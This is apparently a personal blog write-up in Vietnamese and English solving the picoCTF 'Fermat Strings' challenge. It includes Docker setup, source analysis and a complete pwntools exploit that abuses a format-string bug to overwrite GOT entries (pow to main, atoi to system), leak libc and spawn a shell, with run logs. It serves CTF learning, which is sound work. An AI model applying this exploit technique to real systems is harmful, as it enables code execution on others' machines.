# fermat_strins 

Oke, bài này hmmm khá hay với mình, tại vì nó tổng hợp những kiến thức mình học được 1 cách rời rạc vào cùng 1 bài. 

### file

```shell
hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/Pico/fermat_strings_final/bin$ file chall
chall: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=964ca3b1c1c143aa765fc3c0aa4552bb6ec4cb08, not stripped

hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/Pico/fermat_strings_final/bin$ checksec chall
[*] '/mnt/d/pwn_myself/Pico/fermat_strings_final/bin/chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x3ff000)
    RUNPATH:  b'.'

```



***keo xuong duoi cho phan detail. But now, it's really important, about docker in ctf, libc file, just below:***

## remote solve

Phần này làm mình khá nhiều tgian, mò từ doker đến cách sử dụng libc blabla. Oke let's go

```shell
hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/Pico/fermat_strings_final$ ls
Dockerfile  chall  chall.c
hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/Pico/fermat_strings_final$ sudo docker build . -t fermat_string
[sudo] password for hjn4:
ERROR: Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running?

```

Thì trong môi trường wsl thì cần chạy thêm lệnh sau: **sudo dockerd --iptables=false**

```shell
hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/Pico/fermat_strings_final$ sudo dockerd --iptables=false
INFO[2023-08-12T23:21:18.517444365+07:00] Starting up

INFO[2023-08-12T23:21:18.518773131+07:00] containerd not running, starting managed containerd
INFO[2023-08-12T23:21:18.520854266+07:00] started new containerd process                address=/var/run/docker/containerd/containerd.sock module=libcontainerd pid=4450
INFO[2023-08-12T23:21:18.642747758+07:00] starting containerd
            revision=8165feabfdfe38c65b599c4993d227328c231fca version=1.6.22
INFO[2023-08-12T23:21:18.651845970+07:00] loading plugin "io.containerd.content.v1.content"...  type=io.containerd.content.v1

```

tiếp theo sẽ tiến hành build :

```shell
hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/Pico/fermat_strings_final$ sudo docker build . -t fermat_string
[+] Building 2.0s (10/10) FINISHED                           docker:default
 => [internal] load build definition from Dockerfile                   0.0s
 => => transferring dockerfile: 232B                                   0.0s
 => [internal] load .dockerignore                                      0.0s
 => => transferring context: 2B                                        0.0s
 => [internal] load metadata for docker.io/library/ubuntu@sha256:7032  1.9s
 => [internal] load metadata for docker.io/redpwn/jail:sha-a795cdd     1.9s
 => FROM docker.io/library/ubuntu@sha256:703218c0465075f4425e58fac086  0.0s
 => [stage-0 1/4] FROM docker.io/redpwn/jail:sha-a795cdd@sha256:efca7  0.0s
 => [internal] load build context                                      0.0s
 => => transferring context: 2B                                        0.0s
 => CACHED [stage-0 2/4] COPY --from=ubuntu@sha256:703218c0465075f442  0.0s
 => ERROR [stage-0 3/4] COPY bin/flag.txt /srv/app/flag.txt            0.0s
 => ERROR [stage-0 4/4] COPY bin/chall /srv/app/run                    0.0s
------
 > [stage-0 3/4] COPY bin/flag.txt /srv/app/flag.txt:
------
------
 > [stage-0 4/4] COPY bin/chall /srv/app/run:
------
Dockerfile:5
--------------------
   3 |     COPY --from=ubuntu@sha256:703218c0465075f4425e58fac086e09e1de5c340b12976ab9eb8ad26615c3715 / /srv
   4 |
   5 | >>> COPY bin/flag.txt /srv/app/flag.txt
   6 |     COPY bin/chall /srv/app/run
   7 |
--------------------
ERROR: failed to solve: failed to compute cache key: failed to calculate checksum of ref 3d85fa7c-297d-41e8-89e8-fbc3ebb34f18::xm0ujr5y8k8sg26cvt27myxyd: failed to walk /var/lib/docker/tmp/buildkit-mount4154452855/bin: lstat /var/lib/docker/tmp/buildkit-mount4154452855/bin: no such file or directory

```


ta thấy là 2 bước cuối của docker file lúc build thì bị fail, cụ thể thì nó copy file ở trong thư mục bin như trên, tuy nhiên thì hiện tại làm đếch gì có thư mục bin nào. Do đó ta phải làm cho nó có chứ bro :3

```shell
hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/Pico/fermat_strings_final$ mkdir bin
hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/Pico/fermat_strings_final$ ls
Dockerfile  bin  chall  chall.c
hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/Pico/fermat_strings_final$ echo "local flag" > flag.txt
hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/Pico/fermat_strings_final$ cp chall bin/chall
hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/Pico/fermat_strings_final$ cp flag.txt bin/flag.txt
hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/Pico/fermat_strings_final$ ls bin
chall  flag.txt
hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/Pico/fermat_strings_final$ ls
Dockerfile  bin  chall  chall.c  flag.txt

```

And now, build docker again

```shell
hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/Pico/fermat_strings_final$ sudo docker build . -t fermat_string
[+] Building 1.9s (11/11) FINISHED                           docker:default
 => [internal] load .dockerignore                                      0.0s
 => => transferring context: 2B                                        0.0s
 => [internal] load build definition from Dockerfile                   0.0s
 => => transferring dockerfile: 232B                                   0.0s
 => [internal] load metadata for docker.io/library/ubuntu@sha256:7032  0.0s
 => [internal] load metadata for docker.io/redpwn/jail:sha-a795cdd     1.7s
 => FROM docker.io/library/ubuntu@sha256:703218c0465075f4425e58fac086  0.0s
 => [internal] load build context                                      0.0s
 => => transferring context: 8.88kB                                    0.0s
 => [stage-0 1/4] FROM docker.io/redpwn/jail:sha-a795cdd@sha256:efca7  0.0s
 => CACHED [stage-0 2/4] COPY --from=ubuntu@sha256:703218c0465075f442  0.0s
 => [stage-0 3/4] COPY bin/flag.txt /srv/app/flag.txt                  0.0s
 => [stage-0 4/4] COPY bin/chall /srv/app/run                          0.0s
 => exporting to image                                                 0.0s
 => => exporting layers                                                0.0s
 => => writing image sha256:30d57d04e70fb7e68dd2d9e2c6806263f23c8d251  0.0s
 => => naming to docker.io/library/fermat_string                       0.0s
hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/Pico/fermat_strings_final$ sudo docker images
REPOSITORY      TAG       IMAGE ID       CREATED          SIZE
fermat_string   latest    30d57d04e70f   12 seconds ago   84.4MB

```
So it's perfect. And now, after building, we will run this images

```shell
hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/Pico/fermat_strings_final$ sudo docker ps
CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES
hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/Pico/fermat_strings_final$ sudo docker run --rm -p5000:5000 --privileged -it fermat_string
[I][2023-08-12T16:33:38+0000] Mode: LISTEN_TCP
[I][2023-08-12T16:33:38+0000] Jail parameters: hostname:'app', chroot:'', process:'/app/run', bind:[::]:5000, max_conns:0, max_conns_per_ip:0, time_limit:30, personality:0, daemonize:false, clone_newnet:true, clone_newuser:true, clone_newns:true, clone_newpid:true, clone_newipc:true, clone_newuts:true, clone_newcgroup:true, keep_caps:false, disable_no_new_privs:false, max_cpus:1
[I][2023-08-12T16:33:38+0000] Mount: '/' flags:MS_RDONLY type:'tmpfs' options:'' dir:true
[I][2023-08-12T16:33:38+0000] Mount: '/srv' -> '/' flags:MS_RDONLY|MS_NOSUID|MS_NODEV|MS_BIND|MS_REC|MS_PRIVATE type:'' options:'' dir:true
[I][2023-08-12T16:33:38+0000] Uid map: inside_uid:1000 outside_uid:1000 count:1 newuidmap:false
[I][2023-08-12T16:33:38+0000] Gid map: inside_gid:1000 outside_gid:1000 count:1 newgidmap:false
[I][2023-08-12T16:33:38+0000] Listening on [::]:5000


```

Let's see

```shell
hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/Pico/fermat_strings_final$ sudo docker ps
[sudo] password for hjn4:
CONTAINER ID   IMAGE           COMMAND          CREATED          STATUS          PORTS                                       NAMES
727f7a6b9d33   fermat_string   "/jail/run.sh"   41 seconds ago   Up 40 seconds   0.0.0.0:5000->5000/tcp, :::5000->5000/tcp   tender_brattain

```

from now, the **container id** and **NAMES** will be used regularly

```shell
hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/Pico/fermat_strings_final$ nc 0 5000
Welcome to Fermat\'s Last Theorem as a service
A: 1
B: 2
Calculating for A: 1 and B: 2

```

Có 1 vấn đề là mình vẫn chưa thể debug (gdb) với process ID, i dont know why, maybe because of gdb-version, i think so. But  i will fix it in the future, maybe tommorrow :))

```shell
hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/Pico/fermat_strings_final$ sudo docker exec -it 727f7a6b9d33 /bin/sh
/ # ls
bin    etc    jail   lib64  root   sys    usr
dev    home   lib    proc   srv    tmp    var
/ #

```

Quay lại với file docker : 

```python
FROM redpwn/jail:sha-a795cdd

COPY --from=ubuntu@sha256:703218c0465075f4425e58fac086e09e1de5c340b12976ab9eb8ad26615c3715 / /srv

COPY bin/flag.txt /srv/app/flag.txt
COPY bin/chall /srv/app/run

```

Hiện tại thì mình chưa học sâu về docker, cơ mà :)) mình sẽ học sớm thoi, ít nhất là tối ngày mai :)), trust me, you just trust me bro :))

thì đại khái là trong 1 cái máy ảo này ***FROM redpwn/jail:sha-a795cdd*** sẽ có 1 cái máy ảo thế này ***--from=ubuntu@sha256:703218c0465075f4425e58fac086e09e1de5c340b12976ab9eb8ad26615c3715*** được custom và public, ta có thể thấy là cái thư mục gốc **/** giờ đây đã là **/srv** oke, thì thường file libc trong kiến trúc 64-bit nó sẽ ở thư mục   ***/usr/lib/x86_64-linux-gnu/libc.so.6***


```shell
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
             Start                End Perm     Size Offset File
          0x400000           0x401000 r--p     1000      0 /mnt/d/pwn_myself/Pico/Local_Target/local-target
          0x401000           0x402000 r-xp     1000   1000 /mnt/d/pwn_myself/Pico/Local_Target/local-target
          0x402000           0x403000 r--p     1000   2000 /mnt/d/pwn_myself/Pico/Local_Target/local-target
          0x403000           0x404000 r--p     1000   2000 /mnt/d/pwn_myself/Pico/Local_Target/local-target
          0x404000           0x405000 rw-p     1000   3000 /mnt/d/pwn_myself/Pico/Local_Target/local-target
    0x7ffff7d8a000     0x7ffff7d8d000 rw-p     3000      0 [anon_7ffff7d8a]
    0x7ffff7d8d000     0x7ffff7db5000 r--p    28000      0 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7db5000     0x7ffff7f4a000 r-xp   195000  28000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7f4a000     0x7ffff7fa2000 r--p    58000 1bd000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7fa2000     0x7ffff7fa6000 r--p     4000 214000 /usr/lib/x86_64-linux-gnu/libc.so.6

```

check it


```shell
hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/Pico/fermat_strings_final$ sudo docker exec -it 727f7a6b9d33 /bin/sh
/ # ls
bin    etc    jail   lib64  root   sys    usr
dev    home   lib    proc   srv    tmp    var
/ # cd srv
/srv # ls
app     dev     lib     libx32  opt     run     sys     var
bin     etc     lib32   media   proc    sbin    tmp
boot    home    lib64   mnt     root    srv     usr
/srv # cd usr/lib/x86_64-linux-gnu/
/srv/usr/lib/x86_64-linux-gnu # ls | grep "libc"
libc-2.31.so
libc.so.6
libcap-ng.so.0
libcap-ng.so.0.0.0
libcom_err.so.2
libcom_err.so.2.1
libcrypt.so.1
libcrypt.so.1.1.0

```

Oke, giờ thì copy cái file libc ra ngoài host thoi. Cơ mà có 1 vấn là do mình không thể debug (gdb) với PID của process nên là ở đây kiểu như đoán mò file libc :)) thế quái nào nhợ :((.


```shell
hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/Pico/fermat_strings_final$ cd bin
hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/Pico/fermat_strings_final/bin$ ls
chall  flag.txt
hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/Pico/fermat_strings_final/bin$ sudo docker cp tender_brattain:/srv/usr/lib/x86_64-linux-gnu/libc-2.31.so .
Successfully copied 2.03MB to /mnt/d/pwn_myself/Pico/fermat_strings_final/bin/.
hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/Pico/fermat_strings_final/bin$ ls
chall  flag.txt  libc-2.31.so


```

OKe giờ đã có file libc :)). chúng ta có thể dùng bằng vài cách như sau:

* readelf -sW libc-2.31.so | grep "system" , lưu offset và dùng trực tiếp trong script luôn
* import libc vào rồi gọi đến lic.symbols['system'] để lấy offset 

Mà để làm được cách thứ 2 í, thì cần ***pwninit*** 

```shell
hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/Pico/fermat_strings_final/bin$ pwnini
t
bin: ./chall
libc: ./libc-2.31.so

fetching linker
https://launchpad.net/ubuntu/+archive/primary/+files//libc6_2.31-0ubuntu9.1_amd64.deb
unstripping libc
https://launchpad.net/ubuntu/+archive/primary/+files//libc6-dbg_2.31-0ubuntu9.1_amd64.deb
symlinking ./libc.so.6 -> libc-2.31.so
copying ./chall to ./chall_patched
running patchelf on ./chall_patched
writing solve.py stub

hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/Pico/fermat_strings_final/bin$ patchelf --set-interpreter ld-2.31.so chall
hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/Pico/fermat_strings_final/bin$ patchelf --set-rpath . chall
```

recv

```shell
hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/Pico/fermat_strings_final/bin$ python3 exploit.py
[*] '/mnt/d/pwn_myself/Pico/fermat_strings_final/bin/chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x3ff000)
    RUNPATH:  b'.'
[*] '/mnt/d/pwn_myself/Pico/fermat_strings_final/bin/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process '/mnt/d/pwn_myself/Pico/fermat_strings_final/bin/chall': pid 15717
[*] Main address: 0x400837
[*] pow() GOT address: 0x601040
/home/hjn4/.local/lib/python3.10/site-packages/pwnlib/tubes/tube.py:840: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  res = self.recvuntil(delim, timeout=timeout)
/mnt/d/pwn_myself/Pico/fermat_strings_final/bin/exploit.py:35: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  r.recvuntil("Calculating for A: ")
[*] rewrote pow GOT to main
[*] puts() GOT address: 0x601018
[*] Sending:
    A:
    b'1_______%43$s.%44$s.'
    B:
    00000000  31 5f 5f 5f  5f 5f 5f 5f  18 10 60 00  00 00 00 00  │1___│____│··`·│····│
    00000010  58 10 60 00  00 00 00 00                            │X·`·│····│
    00000018
[*] Received:
    00000000  a0 65 d7 86  fd 7e 2e 30  67 d3 86 fd  7e 2e        │·e··│·~.0│g···│~.│
    0000000e
[*] puts() runtime address: 0x7efd86d765a0
[*] atoi() runtime address: 0x7efd86d36730
[*] libc_base address: 0x7efd86cef000
[*] system address: 0x7efd86d44410
[*] atoi() GOT address: 0x601058
Original values:
High: 32509
Medium: 34516
Low: 17424

Sorted values:
low: 17424 11
high: 32509 13
medium: 34516 12
/mnt/d/pwn_myself/Pico/fermat_strings_final/bin/exploit.py:124: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  r.recvuntil("Calculating for A: ")
[*] rewrote atoi GOT to system
[*] Switching to interactive mode
$ ls
chall           core       flag.txt    libc-2.31.so  solve.py
chall_patched  exploit.py  ld-2.31.so  libc.so.6
$
[*] Stopped process '/mnt/d/pwn_myself/Pico/fermat_strings_final/bin/chall' (pid 15717)







hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/Pico/fermat_strings_final/bin$ python3 exploit.py REMOTE
[*] '/mnt/d/pwn_myself/Pico/fermat_strings_final/bin/chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x3ff000)
    RUNPATH:  b'.'
[*] '/mnt/d/pwn_myself/Pico/fermat_strings_final/bin/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to mars.picoctf.net on port 31929: Done
[*] Main address: 0x400837
[*] pow() GOT address: 0x601040
/home/hjn4/.local/lib/python3.10/site-packages/pwnlib/tubes/tube.py:840: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  res = self.recvuntil(delim, timeout=timeout)
/mnt/d/pwn_myself/Pico/fermat_strings_final/bin/exploit.py:35: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  r.recvuntil("Calculating for A: ")
[*] rewrote pow GOT to main
[*] puts() GOT address: 0x601018
[*] Sending:
    A:
    b'1_______%43$s.%44$s.'
    B:
    00000000  31 5f 5f 5f  5f 5f 5f 5f  18 10 60 00  00 00 00 00  │1___│____│··`·│····│
    00000010  58 10 60 00  00 00 00 00                            │X·`·│····│
    00000018
[*] Received:
    00000000  a0 b5 6f 02  91 7f 2e 30  b7 6b 02 91  7f 2e        │··o·│··.0│·k··│·.│
    0000000e
[*] puts() runtime address: 0x7f91026fb5a0
[*] atoi() runtime address: 0x7f91026bb730
[*] libc_base address: 0x7f9102674000
[*] system address: 0x7f91026c9410
[*] atoi() GOT address: 0x601058
Original values:
High: 32657
Medium: 620
Low: 37904

Sorted values:
medium: 620 12
high: 32657 13
low: 37904 11
/mnt/d/pwn_myself/Pico/fermat_strings_final/bin/exploit.py:124: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  r.recvuntil("Calculating for A: ")
[*] rewrote atoi GOT to system
[*] Switching to interactive mode
$ ls
flag.txt
run
$
[*] Closed connection to mars.picoctf.net port 31929
hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/Pico/fermat_strings_final/bin$

```


### full my exploit code


```python
from pwn import *

binary = ELF("chall")

libc = ELF("libc.so.6")

if not args.REMOTE:
    r = process(binary.path)
    #gdb.attach(r, api = True)
    
   
else:
    r = remote('mars.picoctf.net', 31929)
    # puts_offset_libc = 0x0875a0
    # system_offset = 0x055410

puts_offset_libc = libc.symbols["puts"] 
system_offset = libc.symbols['system'] 

pow_got = binary.got['pow']
main_addr = binary.symbols['main']

log.info(f"Main address: {hex(main_addr)}") # 0x400837
log.info(f"pow() GOT address: {hex(pow_got)}") # 0x601040

payload1 = b"11111111" + p64(pow_got) #+ p64(pow_got+4)

r.sendlineafter("A: ",payload1)

payload2 = b"1_______%" + str(int(main_addr) - 46).encode("ascii") + b"p%11$n--" #4196361

r.sendlineafter("B: ",payload2)

r.recvuntil("Calculating for A: ")
log.info("rewrote pow GOT to main")

######################################

def send_payload(r, a, b):
    log.info(f"Sending:\nA:\n{a}\nB:\n{hexdump(b)}")
    r.sendlineafter("A: ", a)
    r.sendlineafter("B: ", b)

def send_format(r, format, values):
    format_prefix = b'1_______'
    values_prefix = b'1_______'
    send_payload(r, format_prefix + format, values_prefix + values)
    out = r.recvline()
    arr = out.split(b" and ")
    res = arr[0].replace(b"Calculating for A: " + format_prefix, b"")
    log.info(f"Received:\n{hexdump(res)}")
    return res

log.info(f"puts() GOT address: {hex(binary.got['puts'])}")


output = send_format(r, b"%43$s.%44$s.", p64(binary.got["puts"]) + p64(binary.got["atoi"]))


puts_addr_str = output.split(b'.')[0].ljust(8, b'\x00')
atoi_addr_str = output.split(b".")[1].ljust(8, b'\x00')
puts_addr = int.from_bytes(puts_addr_str, "little") 
atoi_addr = int.from_bytes(atoi_addr_str, "little") 

log.info(f"puts() runtime address: {hex(puts_addr)}\n")

log.info(f"atoi() runtime address: {hex(atoi_addr)}\n")


libc_base_addr = u64(puts_addr_str) - puts_offset_libc
log.info(f"libc_base address: {hex(libc_base_addr)}\n")


system_addr = libc_base_addr + system_offset
log.info(f"system address: {hex(system_addr)}\n") 

##########################################################

atoi_got = binary.got['atoi']

log.info(f"atoi() GOT address: {hex(atoi_got)}") 

system_addr_high = (system_addr >> 32) & 0xFFFF
system_addr_medium = (system_addr >> 16) & 0xFFFF
system_addr_low = system_addr & 0xFFFF

print("Original values:")
print("High:", int(system_addr_high))
print("Medium:", int(system_addr_medium))
print("Low:", int(system_addr_low))

values = [
    ("high", system_addr_high, "13" ),
    ("medium", system_addr_medium, "12" ),
    ("low", system_addr_low, "11")
]

values.sort(key=lambda x: x[1])

print("\nSorted values:")

for item in values:
    print(item[0] + ":" , item[1] , item[2] )


payload1 = b"11111111" + p64(atoi_got ) + p64(atoi_got + 2 ) + p64(atoi_got + 4)

r.sendlineafter("A: ",payload1)

#payload2 = b"1_______%1p%12$n%2p%11$n"

# payload2 = b"1_______%" + str(int(system_addr_high) - 46).encode("ascii") + b"p%13$hn%" 
# payload2 += str(int(system_addr_low) - int(system_addr_high)).encode("ascii") + b"p%11$hn%"
# payload2 += str(int(system_addr_medium) - int(system_addr_low)).encode("ascii") + b"p%12$hn--" 
payload2 = b"1_______%" + str(values[0][1] - 46).encode("ascii") + b"p%" + values[0][2].encode("ascii") + b"$hn%" 
payload2 += str(values[1][1] - values[0][1]).encode("ascii") + b"p%"+ values[1][2].encode("ascii") + b"$hn%"
payload2 += str(values[2][1] - values[1][1]).encode("ascii") + b"p%"+ values[2][2].encode("ascii") + b"$hn--" 

r.sendlineafter("B: ",payload2)

##################################

r.recvuntil("Calculating for A: ")
log.info("rewrote atoi GOT to system")

payload1 = b"/bin/sh\x00"
r.sendlineafter("A: ",payload1)
payload2 = b"/sh"
r.sendlineafter("B: ",payload2)
                
r.interactive()




```


## Detail

Sorry vì có vài thứ ở tận đây, tuy nhiên vì mình muốn note những thứ quan trọng lên trên để dễ search, so my blog, my choice :))

### source

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <math.h>

#define SIZE 0x100

int main(void)
{
  char A[SIZE];
  char B[SIZE];

  int a = 0;
  int b = 0;

  puts("Welcome to Fermat\\'s Last Theorem as a service");

  setbuf(stdout, NULL);
  setbuf(stdin, NULL);
  setbuf(stderr, NULL);

  printf("A: ");
  read(0, A, SIZE);
  printf("B: ");
  read(0, B, SIZE);

  A[strcspn(A, "\n")] = 0; // return len 
  B[strcspn(B, "\n")] = 0; // B[len] = 0 ???, maybe it like null byte :))

  a = atoi(A);
  b = atoi(B); // convert to int

  if(a == 0 || b == 0) {
    puts("Error: could not parse numbers!");
    return 1;
  }

  char buffer[SIZE];
  snprintf(buffer, SIZE, "Calculating for A: %s and B: %s\n", A, B);
  printf(buffer);

  int answer = -1;
  for(int i = 0; i < 100; i++) {
    if(pow(a, 3) + pow(b, 3) == pow(i, 3)) {
      answer = i;
    }
  }

  if(answer != -1) printf("Found the answer: %d\n", answer);
}

```

### info func

**strcspn(str1,str2)** : hàm này trả về số kí tự trong str1 mà không xuất hiện kí tự nào trong str2. Ở source trên thì làm nhiệm vụ thay kí tự xuống dòng thành null byte

**snprintf()** : trả về số kí tự đã được ghi vào buffer

### bug

ở đây ta có thể thấy là lỗi format string, tuy nhiên thì trước đấy có 1 cái filter trá hình là **atoi()** thằng oắt này sẽ convert sang số, và nếu kết quả = 0, tức không convert được thì tiu. So, chúng ta cần bypass chỗ này, giờ thì xem thg atoi nó thật sự làm cái gì 

> int atoi (const char * str);
>> Convert string to integer
>> Parses the C-string str interpreting its content as an integral number, which is returned as a value of type int.
>>
>> The function first discards as many whitespace characters (as in isspace) as necessary until the first non-whitespace character is found. Then, starting from this character, takes an optional initial plus or minus sign followed by as many base-10 digits as possible, and interprets them as a numerical value.
>>
>> The string can contain additional characters after those that form the integral number, which are ignored and have no effect on the behavior of this function.
>>
>> If the first sequence of non-whitespace characters in str is not a valid integral number, or if no such sequence exists because either str is empty or it contains only whitespace characters, no conversion is performed and zero is returned.


Đại khái có thể hiểu là nó chỉ convert các chữ số trong 1 string thành int và kệ mấy cái kí tự khác, miễn là kí tự đầu tiên phải là số. EX: atoi(1a2) = 1

Kịch bản khai thác đại khái sẽ như sau:


* payload khai thác có dạng 1_blabla_for_exploit
* Lợi dụng format string để overwrite got của pow => main để có thể tiến hành gửi payload nhiều lần dễ dàng
* Leak ra được địa chỉ runtime của các hàm nào đấy để tính libc base, tuy nhiên cần xác định được thư viện sử dụng là gì 
* overwrite got của atoi => system, bởi có chỗ gọi atoi(A) , lúc này ghi A = "/bin/sh" => lấy shell

### overwrite pow GOT to main address




```shell
hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/Pico/fermat_strings$ python3 exploit_pow_main.py
[*] '/mnt/d/pwn_myself/Pico/fermat_strings/chall'
    Arch:     amd64-64-little
[*] '/mnt/d/pwn_myself/Pico/fermat_strings/chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process './chall': pid 24860
[*] running in new terminal: ['/usr/bin/gdb', '-q', './chall', '24860', '-x', '/tmp/pwnj63xhhen.gdb']
[-] Waiting for debugger: debugger exited! (maybe check /proc/sys/kernel/yama/ptrace_scope)
[*] Main address: 0x400837
[*] pow() GOT address: 0x601040
16
[*] Switching to interactive mode
Calculating for A: 11111111@\x10` and B: 1_______0x400bd8--------
$

```

```python
hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself$ python3
Python 3.10.12 (main, Jun 11 2023, 05:26:28) [GCC 11.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> len("1_______%4196361p%11$n--")
24
>>> len("Calculating for A: 11111111@\x10` and B: 1_______")
46
>>> 0x400837
4196407
>>> 0x400809
4196361
>>> 4196407 - 4196361
46


```


```python
from pwn import *

binary = ELF("chall")
r = process("./chall")
gdb.attach(r, api = True)

pow_got = binary.got['pow']
main_addr = binary.symbols['main']

log.info(f"Main address: {hex(main_addr)}") # 0x400837
log.info(f"pow() GOT address: {hex(pow_got)}") # 0x601040


payload1 = b"11111111" + p64(pow_got) #+ p64(pow_got+4)

r.sendlineafter(b"A: ",payload1)

#payload2 = b"1_______%1p%11$n--------"
payload2 = b"1_______%" + str(int(main_addr) - 46).encode("ascii") + b"p%11$n--" #4196361

r.sendlineafter(b"B: ",payload2)

r.interactive()

```

Vấn đề tại sao lại trừ 46 í, thì là do cơ chế ghi với formatstring là sẽ in ra màn hình 15 kí tự đi ha rồi sẽ ghi giá trị hex(15) vào địa chỉ ở tham số chỉ định. mà trước đó đã in ra "blabla" tổng 46 kí tự rồi nên giờ phải trừ ra.

Thêm vấn đề là tại sao là tham số thứ 11 thì, chuỗi mình ghi vào sẽ bắt đầu ở tham số thứ 10, cứ check là được :))


### leak libc base, and determine libc version

```python
from pwn import *

binary = ELF("chall")
r = process("./chall")
gdb.attach(r, api = True)

def send_payload(r, a, b):
    log.info(f"Sending:\nA:\n{a}\nB:\n{hexdump(b)}")
    r.sendlineafter("A: ", a)
    r.sendlineafter("B: ", b)

def send_format(r, format, values):
    format_prefix = b'1_______'
    values_prefix = b'1_______'
    send_payload(r, format_prefix + format, values_prefix + values)
    out = r.recvline()
    arr = out.split(b" and ")
    res = arr[0].replace(b"Calculating for A: " + format_prefix, b"")
    log.info(f"Received:\n{hexdump(res)}")
    return res

log.info(f"puts() GOT address: {hex(binary.got['puts'])}")

output = send_format(r, b"%43$s.%44$s.%45$s.", p64(binary.got["puts"]) + p64(binary.got["atoi"])+ p64(binary.got["strcspn"]))

print(output)

puts_addr_str = output.split(b'.')[0].ljust(8, b'\x00')
atoi_addr_str = output.split(b".")[1].ljust(8, b'\x00')
strcspn_addr_str = output.split(b".")[2].ljust(8, b'\x00')

puts_addr = int.from_bytes(puts_addr_str, "little") 
atoi_addr = int.from_bytes(atoi_addr_str, "little") 
strcspn_addr = int.from_bytes(strcspn_addr_str, "little") 

log.info(f"puts() runtime address: {hex(puts_addr)}\n")
log.info(f"atoi() runtime address: {hex(atoi_addr)}\n")
log.info(f"strcspn() runtime address: {hex(strcspn_addr)}\n")

r.interactive()

```


Oke thì mình vẫn chưa solve được trên remote do mình vẫn chưa xác định được libc mà remote sử dụng, bài này có cho mình 1 file docker tuy nhiên mình là không biết build thế nào nên là, đợi mình học tí docker rồi quay lại đây :(. trước mắt thì mình cứ solve trên local trước đã.

### overwrite atoi_got => system for the next call main

```python
from pwn import *

binary = ELF("chall")
r = process("./chall")
gdb.attach(r, api = True)

atoi_got = binary.got['atoi']

log.info(f"atoi() GOT address: {hex(atoi_got)}") 


system_addr = 0x7fe0e8abc570 #demo

system_addr_high = (system_addr >> 32) & 0xFFFF
system_addr_medium = (system_addr >> 16) & 0xFFFF
system_addr_low = system_addr & 0xFFFF

print(int(system_addr_high))
print(int(system_addr_medium))
print(int(system_addr_low))


payload1 = b"11111111" + p64(atoi_got) + p64(atoi_got + 2) + p64(atoi_got + 4)

r.sendlineafter(b"A: ",payload1)

#payload2 = b"1_______%1p%12$n%2p%11$n"
payload2 = b"1_______%" + str(int(system_addr_high) - 46).encode("ascii") + b"p%13$hn%" 
